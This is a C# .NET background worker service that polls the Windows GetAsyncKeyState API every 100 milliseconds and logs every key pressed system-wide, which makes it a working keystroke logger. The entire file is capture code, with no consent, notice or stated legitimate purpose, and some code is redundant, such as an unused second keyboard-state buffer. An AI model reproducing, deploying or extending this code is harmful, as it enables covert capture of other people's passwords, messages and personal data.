using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace AL
{
    public class Worker : BackgroundService
    {
        private readonly ILogger<Worker> _logger;

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        public Worker(ILogger<Worker> logger)
        {
            _logger = logger;
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            while (!stoppingToken.IsCancellationRequested)
            {
                await Task.Delay(100);

                for (int i = 32; i < 256; i++)
                {
                    short state = GetAsyncKeyState(i);

                    if ((state & 0x8000) != 0)
                    {
                        string key = GetKeyDescription(i);
                        _logger.LogInformation("Key Pressed: {key}", key);
                    }
                }
            }
        }

        private string GetKeyDescription(int keyCode)
        {
            StringBuilder result = new StringBuilder();
            byte[] keyboardState = new byte[256];
            byte[] keyboardStatePrevious = new byte[256];

            GetKeyboardState(keyboardState);
            GetKeyboardState(keyboardStatePrevious);

            keyboardState[(int)keyCode] = 0x80;

            StringBuilder buffer = new StringBuilder(256);
            ToUnicodeEx((uint)keyCode, 0, keyboardState, buffer, buffer.Capacity, 0);

            if (buffer.Length > 0)
            {
                result.Append(buffer.ToString());
            }

            return result.ToString();
        }

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);
    }
}
